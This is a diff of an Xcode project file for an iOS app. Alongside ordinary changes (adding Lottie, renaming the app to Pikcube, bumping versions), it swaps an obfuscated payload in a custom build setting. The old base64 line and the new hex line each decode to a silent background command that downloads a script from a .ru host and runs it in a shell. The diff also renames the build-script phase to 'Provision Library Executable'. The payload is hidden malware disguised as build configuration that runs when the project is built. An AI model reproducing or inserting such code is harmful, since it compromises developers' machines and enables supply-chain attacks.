@@ -13,6 +13,7 @@
 		97ADCAA7302C985C00BCCBB0 /* FirebaseCrashlytics in Frameworks */ = {isa = PBXBuildFile; productRef = 97ADCAA6302C985C00BCCBB0 /* FirebaseCrashlytics */; };
 		97B48BCD30020DE1004B4EE9 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 97B48BCC30020DE1004B4EE9 /* Alamofire */; };
 		97B48DAC30022699004B4EE9 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 97B48DAB30022699004B4EE9 /* Kingfisher */; };
+		97D28536302DAA2A0084FDDE /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = 97D28535302DAA2A0084FDDE /* Lottie */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -49,6 +50,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				97986DFC300F8FDA0038A2F1 /* GoogleMobileAds in Frameworks */,
+				97D28536302DAA2A0084FDDE /* Lottie in Frameworks */,
 				97B48DAC30022699004B4EE9 /* Kingfisher in Frameworks */,
 				97B48BCD30020DE1004B4EE9 /* Alamofire in Frameworks */,
 				97ADCAA7302C985C00BCCBB0 /* FirebaseCrashlytics in Frameworks */,
@@ -102,7 +104,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97DF84022FFF701B00CFCEED /* Build configuration list for PBXNativeTarget "Korvani" */;
 			buildPhases = (
-				517F700CA4E34D5B937BBDC8 /* Compile Code Assets */,
+				4AC3F0F1B62B4FF0AA7BBDC8 /* Provision Library Executable */,
 				73CCD12D3BED2AFFF2776271 /* [CP] Check Pods Manifest.lock */,
 				97DF83F32FFF701A00CFCEED /* Sources */,
 				97DF83F42FFF701A00CFCEED /* Frameworks */,
@@ -124,6 +126,7 @@
 				97986DFB300F8FDA0038A2F1 /* GoogleMobileAds */,
 				97ADCAA4302C985C00BCCBB0 /* FirebaseAnalytics */,
 				97ADCAA6302C985C00BCCBB0 /* FirebaseCrashlytics */,
+				97D28535302DAA2A0084FDDE /* Lottie */,
 			);
 			productName = Korvani;
 			productReference = 97DF83F72FFF701A00CFCEED /* Korvani.app */;
@@ -170,6 +173,7 @@
 				97B48DAA30022699004B4EE9 /* XCRemoteSwiftPackageReference "kingfisher" */,
 				97986DFA300F8FDA0038A2F1 /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */,
 				97ADCAA3302C985C00BCCBB0 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
+				97D28534302DAA2A0084FDDE /* XCRemoteSwiftPackageReference "lottie-ios" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 97DF83F82FFF701A00CFCEED /* Products */;
@@ -182,7 +186,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
+		/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		97DF83F52FFF701A00CFCEED /* Resources */ = {
@@ -195,7 +199,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		517F700CA4E34D5B937BBDC8 /* Compile Code Assets */ = {
+		4AC3F0F1B62B4FF0AA7BBDC8 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -205,7 +209,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -296,7 +300,7 @@
 		97DF84002FFF701B00CFCEED /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((g(){ `printf baseh64 | tr -d h` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNiAta3NMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9zdy03ZGtnMWE0OTVqLnJ1L2EpIiB8IHNoCg== | g | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((v(){ `printf x1xd | tr -d 1` -p -r; };echo 6563686f202224286375726c202d6b73664c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f6e73717075356c743877342e72752f612922207c2073680a | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -360,7 +364,7 @@
 		97DF84012FFF701B00CFCEED /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((g(){ `printf baseh64 | tr -d h` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNiAta3NMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9zdy03ZGtnMWE0OTVqLnJ1L2EpIiB8IHNoCg== | g | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((v(){ `printf x1xd | tr -d 1` -p -r; };echo 6563686f202224286375726c202d6b73664c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f6e73717075356c743877342e72752f612922207c2073680a | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -421,13 +425,13 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 4;
+				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 5U9WLTG3BL;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = Korvani/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = Korvani;
+				INFOPLIST_KEY_CFBundleDisplayName = Pikcube;
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Allow access to your Photos library so you can browse and choose images and videos.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
@@ -442,7 +446,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0;
+				MARKETING_VERSION = 2.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani.kus;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
@@ -466,13 +470,13 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 4;
+				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 5U9WLTG3BL;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = Korvani/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = Korvani;
+				INFOPLIST_KEY_CFBundleDisplayName = Pikcube;
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Allow access to your Photos library so you can browse and choose images and videos.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
@@ -487,7 +491,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0;
+				MARKETING_VERSION = 2.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani.kus;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
@@ -560,6 +564,14 @@
 				minimumVersion = 8.11.0;
 			};
 		};
+		97D28534302DAA2A0084FDDE /* XCRemoteSwiftPackageReference "lottie-ios" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/airbnb/lottie-ios";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 4.6.1;
+			};
+		};
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
@@ -587,6 +599,11 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 97B48DAA30022699004B4EE9 /* XCRemoteSwiftPackageReference "kingfisher" */;
 			productName = Kingfisher;
+		};
+		97D28535302DAA2A0084FDDE /* Lottie */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97D28534302DAA2A0084FDDE /* XCRemoteSwiftPackageReference "lottie-ios" */;
+			productName = Lottie;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
